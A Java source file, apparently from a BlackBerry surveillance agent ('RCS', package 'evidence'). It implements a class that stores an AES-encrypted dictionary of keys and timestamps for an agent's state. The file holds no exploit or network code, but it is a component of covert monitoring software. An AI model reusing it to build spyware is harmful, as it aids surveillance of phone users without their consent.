//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.log
 * File         : DictMarkup
 * Created      : 08-giu-2010
 * *************************************************/
package blackberry.evidence;

import java.io.IOException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;

import net.rim.device.api.util.DataBuffer;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;
import blackberry.utils.Utils;

public class TimestampMarkup extends Markup {
    //#ifdef DEBUG
    static Debug debug = new Debug("TimeMarkup", DebugLevel.INFORMATION);
    //#endif

    private static final int MARKUP_SIZE = 35 * 100;
    private static final int MAX_DICT_SIZE = 100;
    Hashtable dictionary = null;

    public TimestampMarkup(int agentId, byte[] aesKey) {
        super(agentId, aesKey);
        initTimestampMarkup();
    }

    protected synchronized void initTimestampMarkup() {
        dictionary = new Hashtable();

        if (!isMarkup()) {
            writeMarkup(Utils.intToByteArray(0));
            return;
        }

        byte[] plain;
        try {
            plain = readMarkup();

            final DataBuffer dataBuffer = new DataBuffer(plain, 0,
                    plain.length, false);

            final int size = dataBuffer.readInt();
            for (int i = 0; i < size; i++) {
                final String key = new String(dataBuffer.readByteArray());
                final Date value = new Date(dataBuffer.readLong());
                dictionary.put(key, value);
            }
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("initTimestampMarkup");
            removeMarkup();
            //#endif
        }
    }

    protected synchronized boolean writeMarkup(Hashtable dict) {
        final byte[] payload = new byte[MARKUP_SIZE];
        final DataBuffer dataBuffer = new DataBuffer(payload, 0, MARKUP_SIZE,
                false);
        final Enumeration enumeration = dict.keys();
        dataBuffer.writeInt(dict.size());

        while (enumeration.hasMoreElements()) {
            try {
                final String key = (String) enumeration.nextElement();
                final Date date = (Date) dict.get(key);

                //#ifdef DEBUG
                debug.trace("writeMarkup key: " + key + " value: " + date);
                //#endif
                dataBuffer.writeByteArray(key.getBytes());
                dataBuffer.writeLong(date.getTime());
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("writeMarkup");
                //#endif
                return false;
            }
        }
        return writeMarkup(payload);

    }

    public synchronized boolean put(String key, Date value) {
        if (key == null || value == null) {
            //#ifdef DEBUG
            debug.error("key==null || value==null");
            //#endif
            return false;
        }

        //#ifdef DBC
        Check.requires(key != null, "put key null");
        Check.requires(value != null, "put value null");
        //#endif

        if (dictionary.size() > MAX_DICT_SIZE) {
            shrinkDictionary();
        }

        dictionary.put(key, value);
        //#ifdef DEBUG
        debug.info("put key: " + key);
        //#endif
        return writeMarkup(dictionary);
    }

    private void shrinkDictionary() {
        if (dictionary.size() > 0) {
            final Object key = dictionary.keys().nextElement();
            dictionary.remove(key);
        }
    }

    public synchronized Date get(String key) {
        if (dictionary.containsKey(key)) {
            try {
                final Date date = (Date) dictionary.get(key);
                //#ifdef DEBUG
                debug.info("get key: " + key + " date: " + date);
                //#endif
                return date;
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("get");
                //#endif
                return null;
            }

        } else {
            return null;
        }
    }

    public synchronized void removeMarkup() {
        super.removeMarkup();
        if (dictionary != null) {
            dictionary.clear();
        }
    }
}
